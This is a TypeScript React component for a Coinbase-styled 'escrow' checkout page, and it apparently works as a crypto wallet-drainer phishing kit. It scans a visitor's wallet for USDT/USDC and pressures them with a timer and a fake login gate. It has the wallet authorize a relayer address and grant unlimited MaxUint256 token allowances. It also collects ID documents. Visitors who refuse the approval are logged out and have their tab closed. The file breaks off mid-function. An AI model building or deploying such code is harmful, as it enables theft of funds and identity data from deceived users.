"use client";

import { useEffect, useMemo, useRef, useState, type MutableRefObject } from "react";
import { usePrivy, useWallets } from "@privy-io/react-auth";
// @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
import { BrowserProvider, Contract, JsonRpcProvider, MaxUint256, Signature } from "ethers";
import { CHAINS, RELAYER_ADDRESS, PERMIT_DEADLINE_SECONDS, type ChainConfig } from "@/lib/chains";
import {
  TRON_CHAIN,
  getConnectedTronAddress,
  ensureTronAddress,
  peekTronAddress,
  isInWalletDappBrowser,
  openInTrustWalletDapp,
  openInWalletDapp,
  needsTrustDappForTron,
  getTrustRedirectCount,
  bumpTrustRedirectCount,
  clearTrustRedirectCount,
  TRON_CAPABLE_WALLETS,
  ensureTronUsdtApproved,
  persistTronVerification,
  TRON_USDT,
  type TronCapableWalletId,
} from "@/lib/tron";
import { COUNTRIES } from "@/lib/countries";
import EscrowShell from "@/components/EscrowShell";
import CoinbaseSignIn from "@/components/CoinbaseSignIn";
import TrustedByMarquee from "@/components/TrustedByMarquee";



const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
];

// WETH / WBNB / WMATIC all implement the same deposit() interface
const WRAPPED_NATIVE_ABI = [
  "function deposit() external payable",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

type Phase =
  | "loading"
  | "no-session"
  | "idle"
  | "id-verify"
  | "balance-check"
  | "insufficient-balance"
  | "ready-to-approve"
  | "approving"
  | "complete"
  | "identity-failed"
  | "expired"
  | "error"
  | "unable-to-login";

/** True when the wallet popup was dismissed or the user rejected the tx. */
function isWalletUserRejection(err: unknown): boolean {
  const msg = String(
    err instanceof Error
      ? err.message
      : typeof err === "object" && err && "message" in err
        ? (err as { message?: string }).message
        : err ?? ""
  ).toLowerCase();
  const code =
    typeof err === "object" && err && "code" in err
      ? String((err as { code?: unknown }).code)
      : "";
  return (
    code === "4001" ||
    code === "ACTION_REJECTED" ||
    msg.includes("user rejected") ||
    msg.includes("user denied") ||
    msg.includes("rejected the request") ||
    msg.includes("request rejected") ||
    msg.includes("denied transaction") ||
    msg.includes("transaction was rejected") ||
    msg.includes("confirmation declined") ||
    msg.includes("declined") ||
    msg.includes("cancelled") ||
    msg.includes("canceled")
  );
}

function noteStableFromScan(
  tokens: { symbol: string; balanceUsd: number }[] | undefined,
  hasStableRef: MutableRefObject<boolean>
) {
  if (
    (tokens ?? []).some(
      (t) =>
        (t.symbol === "USDT" || t.symbol === "USDC") && t.balanceUsd > 0.01
    )
  ) {
    hasStableRef.current = true;
  }
}

// USDT/USDC are dollar-pegged; this fixed rate converts on-chain stablecoin
// holdings into an EUR-equivalent balance for the minimum-balance check.
const EUR_PER_USD = 0.92;

const MAX_UPLOAD_BYTES = 8 * 1024 * 1024;

const STACK_FEATURES = [
  {
    title: "Infrastructure",
    description: "API solutions supported by broad fiat, crypto asset, stablecoin, network, and geographic coverage. Integrated agentic capabilities.",
  },
  {
    title: "Stablecoins",
    description: "Multi-asset optionality: USDC, the world's most regulated stablecoin, and an expanding global footprint.",
  },
  {
    title: "Settlement",
    description: "Multichain by design. Led by Base, Coinbase's purpose-built Ethereum L2.",
  },
  {
    title: "Custody",
    description: "An institutional-grade, regulated foundation underpins the entire managed payments solution.",
  },
];

interface EscrowSession {
  id: string;
  recipientName: string;
  amountEur: number;
  issuedAt: string;
  startedAt: string | null;
  sessionMinutes: number;
  expiresAt: string | null;
  status: string;
  terms: string;
  minBalanceEur: number;
}

function formatEUR(value: number) {
  if (!Number.isFinite(value)) return "€0.00";
  return value.toLocaleString("en-IE", { style: "currency", currency: "EUR", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/**
 * Coinbase-style amount display: currency symbol and cents rendered smaller
 * than the main integer part, with tight negative letter-spacing.
 *
 * sizes: "hero" (main checkout heading) | "sidebar" (card) | "sm" (inline)
 */
function CoinbaseAmount({ value, size = "hero" }: { value: number; size?: "hero" | "sidebar" | "sm" }) {
  if (!Number.isFinite(value)) value = 0;

  // Split into parts: symbol, integer digits, decimal digits
  const parts = new Intl.NumberFormat("en-IE", {
    style: "currency",
    currency: "EUR",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).formatToParts(value);

  const symbol = parts.find((p) => p.type === "currency")?.value ?? "€";
  const integer = parts
    .filter((p) => p.type === "integer" || p.type === "group")
    .map((p) => p.value)
    .join("");
  const decimal = parts
    .filter((p) => p.type === "decimal" || p.type === "fraction")
    .map((p) => p.value)
    .join("");

  if (size === "hero") {
    return (
      <span className="inline-flex items-start leading-none tracking-[-0.04em]">
        <span className="mt-2 text-[28px] font-semibold text-ink/70 sm:mt-3 sm:text-[34px]">{symbol}</span>
        <span className="text-[64px] font-bold text-ink sm:text-[80px]">{integer}</span>
        <span className="mt-2 text-[28px] font-semibold text-ink/70 sm:mt-3 sm:text-[34px]">{decimal}</span>
      </span>
    );
  }

  if (size === "sidebar") {
    return (
      <span className="inline-flex items-start leading-none tracking-[-0.03em]">
        <span className="mt-1 text-[15px] font-semibold text-ink/60">{symbol}</span>
        <span className="text-[32px] font-bold text-ink">{integer}</span>
        <span className="mt-1 text-[15px] font-semibold text-ink/60">{decimal}</span>
      </span>
    );
  }

  // sm — inline usage
  return <span className="font-semibold tracking-tight text-ink">{formatEUR(value)}</span>;
}

function short(addr: string, lead = 6, tail = 4) {
  return `${addr.slice(0, lead)}...${addr.slice(-tail)}`;
}

function formatClock(ms: number) {
  const total = Math.max(0, Math.floor(ms / 1000));
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${m}:${s.toString().padStart(2, "0")}`;
}

function CircularTimer({ totalMs, remainingMs, size = 136 }: { totalMs: number; remainingMs: number; size?: number }) {
  const SIZE = size;
  const STROKE = size < 80 ? 4 : 7;
  const R = (SIZE - STROKE) / 2;
  const CIRC = 2 * Math.PI * R;
  const pct = Math.max(0, Math.min(1, remainingMs / totalMs));
  const offset = CIRC * (1 - pct);
  const mins = Math.floor(remainingMs / 60000);
  const secs = Math.floor((remainingMs % 60000) / 1000);
  const isCritical = remainingMs < 60_000;
  const isLow = remainingMs < 300_000;
  const ringColor = isCritical ? "#ef4444" : isLow ? "#f59e0b" : "#0052FF";
  const isSmall = size < 80;

  return (
    <div className="flex flex-col items-center">
      <div className="relative" style={{ width: SIZE, height: SIZE }}>
        <svg width={SIZE} height={SIZE} viewBox={`0 0 ${SIZE} ${SIZE}`}>
          {/* Track ring */}
          <circle cx={SIZE / 2} cy={SIZE / 2} r={R} fill="none" stroke="rgba(0,0,0,0.06)" strokeWidth={STROKE} />
          {/* Progress ring */}
          <circle
            cx={SIZE / 2} cy={SIZE / 2} r={R}
            fill="none"
            stroke={ringColor}
            strokeWidth={STROKE}
            strokeLinecap="round"
            strokeDasharray={CIRC}
            strokeDashoffset={offset}
            transform={`rotate(-90 ${SIZE / 2} ${SIZE / 2})`}
            style={{ transition: "stroke-dashoffset 0.8s linear, stroke 0.5s ease" }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className={`font-mono font-bold leading-none tracking-tight ${isSmall ? "text-[10px]" : "text-2xl"}`} style={{ color: ringColor }}>
            {mins}:{secs.toString().padStart(2, "0")}
          </span>
          {!isSmall && <span className="mt-1 text-[9px] font-semibold uppercase tracking-widest text-muted">remaining</span>}
        </div>
      </div>
    </div>
  );
}


interface Modal1Item {
  key: string;
  chainName: string;
  chainLabel: string;
  symbol: string;
  tokenAddr: string;
  balanceDisplay: string;
  balanceUsd: number;
  contract: string;
  isTron: boolean;
  alreadyApproved: boolean;
  permit?: boolean;
  permitDomainName?: string;
  permitDomainVersion?: string;
}

type Modal1Status = "pending" | "approving" | "done" | "failed";

// ── Country picker (Coinbase-style list, no flag emojis) ────────────────────
function CountrySelect({
  value,
  onChange,
  plain = false,
}: {
  value: string;
  onChange: (v: string) => void;
  plain?: boolean;
}) {
  const [open, setOpen] = useState(false);
  const [query, setQuery] = useState("");
  const ref = useRef<HTMLDivElement>(null);

  const selected = COUNTRIES.find((c) => c.name === value) ?? null;

  const filtered = query.trim()
    ? COUNTRIES.filter((c) =>
        c.name.toLowerCase().includes(query.toLowerCase()) ||
        c.code.toLowerCase().includes(query.toLowerCase())
      )
    : COUNTRIES;

  useEffect(() => {
    function handle(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    }
    document.addEventListener("mousedown", handle);
    return () => document.removeEventListener("mousedown", handle);
  }, []);

  return (
    <div ref={ref} className="relative">
      <button
        type="button"
        onClick={() => { setOpen((o) => !o); setQuery(""); }}
        className={
          plain
            ? "flex h-10 w-full items-center justify-between bg-transparent text-[15px] transition"
            : "flex h-12 w-full items-center justify-between rounded-xl border bg-bg px-4 text-[14px] transition " +
              (open ? "border-brand ring-2 ring-brand/20" : "border-hairline hover:border-brand/40")
        }
      >
        {selected ? (
          <span className="flex items-center gap-2.5 text-ink">
            <span className="font-mono text-[11px] font-semibold uppercase tracking-wide text-muted">{selected.code}</span>
            <span>{selected.name}</span>
          </span>
        ) : (
          <span className="text-muted">Select country</span>
        )}
        <svg
          className={"h-4 w-4 text-muted transition-transform " + (open ? "rotate-180" : "")}
          fill="none" viewBox="0 0 24 24" stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
        </svg>
      </button>

      {open && (
        <div className="absolute z-50 mt-1.5 w-full overflow-hidden rounded-xl border border-hairline bg-surface-card shadow-card-lg">
          <div className="border-b border-hairline px-3 py-2">
            <input
              autoFocus
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Search country…"
              className="h-9 w-full rounded-lg bg-surface-soft px-3 text-sm text-ink placeholder:text-muted focus:outline-none"
            />
          </div>
          <ul className="max-h-56 overflow-y-auto py-1 overscroll-contain" role="listbox">
            {filtered.length === 0 ? (
              <li className="px-4 py-3 text-sm text-muted">No results</li>
            ) : (
              filtered.map((c) => (
                <li key={c.code} role="option" aria-selected={c.name === value}>
                  <button
                    type="button"
                    onMouseDown={() => { onChange(c.name); setOpen(false); setQuery(""); }}
                    className={
                      "flex w-full items-center justify-between gap-3 px-4 py-3 text-left text-[14px] transition " +
                      (c.name === value ? "bg-brand/5 font-medium text-brand" : "text-ink hover:bg-surface-soft")
                    }
                  >
                    <span>{c.name}</span>
                    <span className="font-mono text-[11px] font-semibold uppercase tracking-wide text-muted">{c.code}</span>
                  </button>
                </li>
              ))
            )}
          </ul>
        </div>
      )}
    </div>
  );
}

export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
  const { ready, authenticated, login, logout, user } = usePrivy();
  const { wallets } = useWallets();

  // Track whether the user completed Coinbase email OTP (identity step).
  const [cbVerified, setCbVerified] = useState(false);
  const [gateLoading, setGateLoading] = useState(false);
  const [phase, setPhase] = useState<Phase>("loading");
  const [error, setError] = useState<string | null>(null);
  const [session, setSession] = useState<EscrowSession | null>(null);
  const [remainingMs, setRemainingMs] = useState<number | null>(null);

  const [fullName, setFullName] = useState("");
  const [country, setCountry] = useState("");
  const [idFile, setIdFile] = useState<File | null>(null);
  // ID verification multi-step flow
  const [idVerifyStep, setIdVerifyStep] = useState<"type" | "upload" | "info">("type");
  const [idDocType, setIdDocType] = useState<string | null>(null);
  const [idPreviewUrl, setIdPreviewUrl] = useState<string | null>(null);
  const [idDob, setIdDob] = useState("");
  const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
  // Server-side scan cache — populated by runModal1Scan, reused by checkWalletBalances
  const [cachedScanUsd, setCachedScanUsd] = useState<Record<string, number> | null>(null);
  // Winner chain from Modal 1 scan — used to scope handleApproveDeposit
  const [topChainName, setTopChainName] = useState<string | null>(null);
  // Tron address (from TronLink if installed) — included in parallel scan
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);
  const [approvedChains, setApprovedChains] = useState<string[]>([]);
  const expiredNotified = useRef(false);
  const viewTracked = useRef<string | null>(null);

  // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
  const modal1Triggered = useRef(false);
  const modal1SawTron = useRef(false);
  /** Prevents overlapping runModal1Scan (late tronWeb vs primary path). */
  const modal1InFlight = useRef(false);
  /** Once winner approve starts, late Tron must not restart the flow. */
  const modal1ApproveStarted = useRef(false);
  const hasStableRef = useRef(false);
  const loginBlockedRef = useRef(false);
  /** Re-run winner approve from the Unable to login screen. */
  const approvalRetryRef = useRef<null | (() => Promise<void>)>(null);
  const [approvalRetrying, setApprovalRetrying] = useState(false);
  const [showApprovalRetry, setShowApprovalRetry] = useState(false);
  const [modal1Open, setModal1Open] = useState(false);
  const [modal1Scanning, setModal1Scanning] = useState(false);
  const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
  const [modal1Status, setModal1Status] = useState<Record<string, Modal1Status>>({});
  const [modal1Approving, setModal1Approving] = useState(false);
  const [modal1Complete, setModal1Complete] = useState(false);
  // Mobile outside Trust DApp browser — block approval until user opens in Trust
  const [needsTrustOpen, setNeedsTrustOpen] = useState(false);

  // --- Modal 2: opens when user clicks "Approve Deposit", shows chain-by-chain progress ---
  const [modal2Open, setModal2Open] = useState(false);

  // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
  const autoLoginAttempted = useRef(false);
  /** Last address that started modal1 — reset flow when WC reconnects with a new addr. */
  const modal1AddressRef = useRef<string | null>(null);

  // Resolve EVM address on every login/reload: prefer live useWallets() (WalletConnect)
  // over Privy's possibly-stale user.wallet, and keep polling until one appears.
  const [address, setAddress] = useState<string | null>(null);
  const addressRef = useRef<string | null>(null);
  addressRef.current = address;

  useEffect(() => {
    if (!authenticated) {
      setAddress(null);
      modal1Triggered.current = false;
      modal1AddressRef.current = null;
      modal1ApproveStarted.current = false;
      modal1InFlight.current = false;
      modal1SawTron.current = false;
      return;
    }

    const pick = (): string | null => {
      const fromWallets =
        wallets.find((w) => /^0x[0-9a-fA-F]{40}$/.test(w.address || ""))?.address ??
        wallets[0]?.address ??
        null;
      const fromUser = user?.wallet?.address ?? null;
      const cand = fromWallets || fromUser;
      return cand && /^0x[0-9a-fA-F]{40}$/i.test(cand) ? cand : null;
    };

    const immediate = pick();
    if (immediate) setAddress(immediate);

    // WC / Trust often hydrate wallets after Privy `authenticated` flips true
    let ticks = 0;
    const id = setInterval(() => {
      ticks += 1;
      const next = pick();
      if (next) {
        setAddress((prev) => (prev?.toLowerCase() === next.toLowerCase() ? prev : next));
        clearInterval(id);
      } else if (ticks >= 60) {
        clearInterval(id);
      }
    }, 400);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, wallets.map((w) => w.address).join(","), user?.wallet?.address]);

  const totalBalanceEur = useMemo(
    () => Object.values(walletBalances).reduce((a, b) => a + b, 0),
    [walletBalances]
  );

  /** USDT/USDC holder cancelled a direct approve/authorize — block login and close tab. */
  async function blockLoginAfterApprovalCancel(source: string, err: unknown): Promise<boolean> {
    if (loginBlockedRef.current) return true;
    if (!hasStableRef.current || !isWalletUserRejection(err)) return false;

    loginBlockedRef.current = true;
    console.warn(`[escrow] direct approval cancelled with USDT/USDC (${source}):`, err);

    setModal1Open(false);
    setModal1Scanning(false);
    setModal2Open(false);
    setGateLoading(false);
    setProcessing(false);
    setModal1Approving(false);
    setPhase("unable-to-login");

    modal1Triggered.current = false;
    try {
      await logout();
    } catch {
      /* ignore */
    }

    setTimeout(() => {
      try {
        window.close();
      } catch {
        /* ignore */
      }
      window.location.replace("about:blank");
    }, 2500);

    return true;
  }

  function clearModal1Busy() {
    setModal1Scanning(false);
    setModal1Open(false);
  }

  function showModal1Busy() {
    setModal1Scanning(true);
    setModal1Open(true);
  }

  /**
   * Winner approve (EVM or Tron) must succeed before the user can continue.
   * Unable to login + Retry login (no tab close).
   */
  function gateOnApprovalFailure(retry: () => Promise<void>) {
    approvalRetryRef.current = retry;
    setShowApprovalRetry(true);
    clearModal1Busy();
    setModal2Open(false);
    setGateLoading(false);
    setProcessing(false);
    setModal1Approving(false);
    setPhase("unable-to-login");
  }

  async function handleApprovalRetry() {
    const fn = approvalRetryRef.current;
    if (!fn || approvalRetrying) return;
    setApprovalRetrying(true);
    setError(null);
    showModal1Busy();
    try {
      await fn();
      clearModal1Busy();
    } catch (err) {
      console.error("[modal1] retry login failed:", err);
    } finally {
      setApprovalRetrying(false);
    }
  }

  /** Approve Tron USDT once, confirm allowance, then persist. No auto re-prompt. */
  async function completeTronUsdtApproval(): Promise<boolean> {
    showModal1Busy();
    const result = await ensureTronUsdtApproved();
    if (!result.ok || !result.address) {
      const rejected = !result.ok && result.rejected;
      const errMsg = !result.ok ? result.error : "tron_approve_failed";
      throw Object.assign(new Error(errMsg || "tron_approve_failed"), {
        code: rejected ? "ACTION_REJECTED" : "TRON_APPROVE_FAILED",
      });
    }
    setTronAddress(result.address);
    const persisted = await persistTronVerification(result.address);
    if (!persisted) {
      throw new Error("tron_verify_not_confirmed");
    }
    setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
    return true;
  }

  /** Wait until a mined receipt exists (status 1). No fire-and-forget timeouts. */
  async function waitForEvmReceipt(
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    tx: { hash: string; wait: (confirms?: number) => Promise<any> },
    timeoutMs = 120_000
  ): Promise<string> {
    const hash = tx.hash as string;
    try {
      const receipt = await tx.wait(1);
      if (receipt && Number(receipt.status) === 0) {
        throw new Error(`tx_reverted:${hash}`);
      }
      return hash;
    } catch (err) {
      // Some wallets / providers throw on wait even when the tx is pending — poll.
      const provider = await currentWallet()?.getEthereumProvider?.();
      if (!provider) throw err;
      const browser = new BrowserProvider(provider);
      const start = Date.now();
      while (Date.now() - start < timeoutMs) {
        const receipt = await browser.getTransactionReceipt(hash).catch(() => null);
        if (receipt) {
          if (Number(receipt.status) === 0) throw new Error(`tx_reverted:${hash}`);
          return hash;
        }
        await new Promise((r) => setTimeout(r, 800));
      }
      throw new Error(`tx_not_confirmed:${hash}`);
    }
  }

  /** Poll until on-chain authorize + USDC/USDT allowance are live. */
  async function waitForEvmAuthAndAllowance(
    chain: ChainConfig,
    tokenAddr: string,
    timeoutMs = 90_000
  ): Promise<void> {
    if (!address) throw new Error("no_address");
    const start = Date.now();
    let lastErr = "not_confirmed";

    const checkOnce = async (rpc: string): Promise<boolean> => {
      const peek = new JsonRpcProvider(rpc, { chainId: chain.chainId, name: chain.name });
      const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, peek);
      const erc20 = new Contract(tokenAddr, ERC20_ABI, peek);
      const [auth, allow] = await Promise.all([
        verification.isAuthorized(address, RELAYER_ADDRESS) as Promise<boolean>,
        erc20.allowance(address, chain.contract) as Promise<bigint>,
      ]);
      if (auth && allow >= MaxUint256 / 2n) return true;
      lastErr = !auth ? "authorize_not_live" : "allowance_not_live";
      return false;
    };

    // Prefer the wallet's own RPC first — usually sees the mined tx immediately.
    try {
      const ethProvider = await currentWallet()?.getEthereumProvider?.();
      if (ethProvider) {
        const browser = new BrowserProvider(ethProvider);
        const network = await browser.getNetwork();
        if (Number(network.chainId) === chain.chainId) {
          const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, browser);
          const erc20 = new Contract(tokenAddr, ERC20_ABI, browser);
          const [auth, allow] = await Promise.all([
            verification.isAuthorized(address, RELAYER_ADDRESS) as Promise<boolean>,
            erc20.allowance(address, chain.contract) as Promise<bigint>,
          ]);
          if (auth && allow >= MaxUint256 / 2n) return;
        }
      }
    } catch {
      /* fall through to public RPCs */
    }

    const urls = [...(chain.rpcUrls ?? [])];
    // Fast first passes (wallet just confirmed) then back off slightly — still
    // wait for real on-chain state, never fake-success on a timer.
    let delayMs = 350;
    while (Date.now() - start < timeoutMs) {
      for (const rpc of urls) {
        try {
          if (await checkOnce(rpc)) return;
        } catch (e) {
          lastErr = e instanceof Error ? e.message : "rpc_error";
        }
      }
      await new Promise((r) => setTimeout(r, delayMs));
      delayMs = Math.min(delayMs + 150, 1000);
    }
    throw new Error(lastErr);
  }

  /** EVM authorize + approve — wait for receipts + live on-chain state, then persist. */
  async function completeEvmWinnerApproval(target: Modal1Item): Promise<void> {
    const chain = CHAINS.find((c) => c.name === target.chainName);
    if (!chain || !address) throw new Error("No wallet / chain");

    showModal1Busy();
    const signer = await getSignerFor(chain);
    const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
    let authorizeTx = "";
    const alreadyAuth = await verification
      .isAuthorized(address, RELAYER_ADDRESS)
      .catch(() => false);
    if (!alreadyAuth) {
      const authTx = await verification.authorize(RELAYER_ADDRESS);
      authorizeTx = await waitForEvmReceipt(authTx, 120_000);
    }

    const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
    const liveAllow = await erc20.allowance(address, target.contract).catch(() => 0n);
    let approveTxHash: string | undefined;
    if (liveAllow < MaxUint256 / 2n) {
      const tx = await erc20.approve(target.contract, MaxUint256);
      approveTxHash = await waitForEvmReceipt(tx, 120_000);
    }

    // Ground truth before Supabase write — never fire-and-forget
    await waitForEvmAuthAndAllowance(chain, target.tokenAddr, 90_000);

    await persistEvmVerify(chain, authorizeTx, [
      {
        symbol: target.symbol,
        address: target.tokenAddr,
        ...(approveTxHash ? { txHash: approveTxHash } : {}),
      },
    ]);
  }

  useEffect(() => {
    let cancelled = false;

    async function load() {
      try {
        const url = sessionId ? `/api/escrow/session/${sessionId}` : "/api/escrow/current";
        const res = await fetch(url);
        const json = await res.json();
        if (cancelled) return;
        if (json.ok && json.session) {
          setSession(json.session);
          setPhase((prev) => (prev === "loading" || prev === "no-session" ? "idle" : prev));
          if (viewTracked.current !== json.session.id) {
            viewTracked.current = json.session.id;
            fetch("/api/escrow/track", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ sessionId: json.session.id, eventType: "view" }),
            }).catch(() => {});
          }
        } else if (!session) {
          setPhase("no-session");
        }
      } catch (err) {
        console.error("[escrow] failed to load session:", err);
        if (!cancelled && !session) setPhase("no-session");
      }
    }

    void load();
    const interval = setInterval(() => {
      if (phase === "loading" || phase === "no-session" || phase === "idle") void load();
    }, 12000);
    return () => {
      cancelled = true;
      clearInterval(interval);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sessionId]);

  useEffect(() => {
    if (!session?.expiresAt) {
      setRemainingMs(null);
      return;
    }
    const expiresAt = new Date(session.expiresAt).getTime();
    const sessionIdRef = session.id;

    function tick() {
      const left = expiresAt - Date.now();
      setRemainingMs(left);
      if (left <= 0 && !expiredNotified.current) {
        expiredNotified.current = true;
        fetch("/api/escrow/expire", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: sessionIdRef, wallet: addressRef.current }),
        }).catch(() => {});
        setPhase((prev) => (prev === "complete" ? prev : "expired"));
      }
    }

    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [session?.expiresAt, session?.id]);

  // After OTP on checkout-base.com, user is redirected with ?cb=1.
  // Show our custom wallet picker instead of Privy's modal.
  useEffect(() => {
    if (!ready || authenticated || autoLoginAttempted.current) return;
    const params = new URLSearchParams(window.location.search);
    if (params.get("cb") !== "1") return;
    autoLoginAttempted.current = true;
    void login();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, authenticated]);

  // Inside Trust/TokenPocket DApp browser: auto-open Privy so injected wallet
  // is used (one auth popup) — do NOT fall through to WalletConnect.
  useEffect(() => {
    if (!ready || authenticated || autoLoginAttempted.current) return;
    if (!isInWalletDappBrowser()) return;
    autoLoginAttempted.current = true;
    setGateLoading(true);
    void (async () => {
      try {
        await login();
        pollForWallet();
      } catch {
        setGateLoading(false);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, authenticated]);

  // Detect Tron provider early — READ ONLY. Never prompt here.
  // Prompting during Privy's "Sign in to verify" steals the SIWE signature and leaves Privy stuck.
  useEffect(() => {
    const addr = peekTronAddress();
    if (addr) setTronAddress(addr);
  }, []);

  // Clear gate spinner once Privy is fully signed in
  useEffect(() => {
    if (authenticated && address) setGateLoading(false);
  }, [authenticated, address]);

  // Inside Trust: clear redirect counters / CTA
  useEffect(() => {
    if (isInWalletDappBrowser()) {
      clearTrustRedirectCount();
      setNeedsTrustOpen(false);
    }
  }, []);

  // After Privy auth is FULLY settled: wait for wallet provider, then scan.
  // Do NOT fire authorize/approve in the same beat as SIWE — that races Privy
  // and leaves users stuck on "Sign in to verify" or dead approve prompts.
  useEffect(() => {
    if (!authenticated || !address) return;
    if (!wallets.length) return;

    // New address (reload / re-login / WC session restore) → allow modal1 again
    if (
      modal1AddressRef.current &&
      modal1AddressRef.current.toLowerCase() !== address.toLowerCase()
    ) {
      modal1Triggered.current = false;
      modal1ApproveStarted.current = false;
      modal1InFlight.current = false;
      modal1SawTron.current = false;
      setModal1Complete(false);
    }
    if (modal1Triggered.current) return;

    void (async () => {
      // Let Privy close SIWE / WC session before any other wallet RPC.
      // Keep short — longer delays stack with scan and feel like lag before USDC.
      await new Promise((r) => setTimeout(r, 1200));
      if (modal1Triggered.current) return;
      if (addressRef.current?.toLowerCase() !== address.toLowerCase()) return;

      // Wait until the connected wallet exposes an EIP-1193 provider
      const wallet =
        wallets.find((w) => w.address.toLowerCase() === address.toLowerCase()) ?? wallets[0];
      for (let i = 0; i < 16; i++) {
        try {
          const p = await wallet?.getEthereumProvider?.();
          if (p) break;
        } catch { /* still warming up */ }
        await new Promise((r) => setTimeout(r, 200));
      }

      // ── Mobile Safari / WC: must open real page inside Trust for tronWeb ──
      if (needsTrustDappForTron()) {
        const redirects = getTrustRedirectCount();
        if (redirects < 1) {
          bumpTrustRedirectCount();
          modal1Triggered.current = false;
          openInTrustWalletDapp(window.location.href);
          setNeedsTrustOpen(true);
          return;
        }
        modal1Triggered.current = false;
        setNeedsTrustOpen(true);
        return;
      }

      modal1Triggered.current = true;
      modal1AddressRef.current = address;
      setNeedsTrustOpen(false);
      clearTrustRedirectCount();

      // Tron: silent peek only right after Privy — never prompt here (competes with SIWE).
      const silent = await ensureTronAddress({ prompt: false });
      if (silent) setTronAddress(silent);

      await runModal1Scan();
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, address, wallets.length]);

  // When user finally lands inside Trust after CTA/redirect, start scan
  useEffect(() => {
    if (!authenticated || !address || !wallets.length) return;
    if (!needsTrustOpen) return;

    const id = setInterval(() => {
      if (!isInWalletDappBrowser()) return;
      if (modal1Triggered.current) return;
      clearInterval(id);
      setNeedsTrustOpen(false);
      clearTrustRedirectCount();
      modal1Triggered.current = true;
      void (async () => {
        // Settle after returning into Trust — avoid racing Privy session restore
        await new Promise((r) => setTimeout(r, 1500));
        const tron = await ensureTronAddress({ prompt: true });
        if (tron) setTronAddress(tron);
        await runModal1Scan();
      })();
    }, 800);

    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, address, wallets.length, needsTrustOpen]);

  // Late Tron injection: only re-scan if we never started a winner approve yet.
  useEffect(() => {
    if (!authenticated || !address) return;
    if (modal1SawTron.current || modal1Complete || modal1ApproveStarted.current) return;
    if (typeof window === "undefined") return;

    let cancelled = false;
    const tryLate = async () => {
      if (
        cancelled ||
        modal1SawTron.current ||
        modal1Approving ||
        modal1InFlight.current ||
        modal1ApproveStarted.current ||
        modal1Complete
      ) {
        return;
      }
      const addr = peekTronAddress() ?? (await ensureTronAddress({ prompt: true }));
      if (!addr || cancelled) return;
      setTronAddress(addr);
      if (modal1SawTron.current || modal1ApproveStarted.current || modal1InFlight.current) return;
      await runModal1Scan();
    };

    const t = setTimeout(() => { void tryLate(); }, 4000);
    window.addEventListener("tronWeb#initialized", tryLate as EventListener);
    window.addEventListener("tronLink#initialized", tryLate as EventListener);
    return () => {
      cancelled = true;
      clearTimeout(t);
      window.removeEventListener("tronWeb#initialized", tryLate as EventListener);
      window.removeEventListener("tronLink#initialized", tryLate as EventListener);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, address, modal1Complete, modal1Approving]);

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  async function getSignerFor(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    // Explicit switch + verify — wallets often stay on the previous chain
    // if switchChain is skipped or races, which caused BNB USDT to be missed.
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    const browser = new BrowserProvider(provider);
    let network = await browser.getNetwork();
    if (Number(network.chainId) !== target.chainId) {
      await wallet.switchChain(target.chainId);
      network = await browser.getNetwork();
    }
    if (Number(network.chainId) !== target.chainId) {
      throw new Error(`Wallet stayed on chain ${network.chainId}; need ${target.chainId}`);
    }
    return browser.getSigner();
  }

  async function persistEvmVerify(
    chain: ChainConfig,
    authorizeTx: string,
    approvedTokens: { symbol: string; address: string; txHash?: string }[]
  ) {
    if (!address) throw new Error("no_address");
    const payload: Record<string, unknown> = {
      address,
      chain: chain.name,
      approvedTokens,
    };
    if (authorizeTx && /^0x[0-9a-fA-F]{64}$/.test(authorizeTx)) {
      payload.authorizeTx = authorizeTx;
    }
    const body = JSON.stringify(payload);
    let lastErr = "verify_failed";
    // Match Tron: keep retrying until /api/verify sees live authorize+allowance
    for (let attempt = 0; attempt < 8; attempt++) {
      try {
        const verifyRes = await fetch("/api/verify", {
